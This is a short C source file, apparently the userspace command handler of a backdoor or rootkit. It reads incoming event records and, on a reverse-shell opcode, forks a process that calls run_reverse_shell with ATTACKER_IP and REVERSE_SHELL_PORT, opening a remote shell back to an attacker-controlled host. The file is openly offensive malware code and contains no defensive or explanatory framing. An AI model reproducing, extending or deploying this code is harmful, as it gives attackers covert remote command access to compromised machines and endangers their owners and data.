#include <stdint.h>
#include <unistd.h>
#include <errno.h>

#include "config.h"
#include "userspace/command_parser.h"
#include "userspace/reverse_shell.h"

static int spawn_reverse_shell()
{
    pid_t reverse_shell_pid = fork();
    if (reverse_shell_pid < 0) {
        int err = errno;
        return -err;
    }

    if (reverse_shell_pid == 0) 
        run_reverse_shell(ATTACKER_IP, REVERSE_SHELL_PORT);

    return 0;
}

int handle_received_command(void *ctx, void *data, size_t data_sz)
{
    (void)ctx;
    (void)data_sz;

    struct event_t {
        uint32_t src_ip;
        uint16_t src_port;
        uint32_t command_opcode;
    } *event = data;

    switch (event->command_opcode) {
    case COMMAND_REVERSE_SHELL:
        spawn_reverse_shell();
        break;
    
    default:
        break;
    }

    return 0;
}
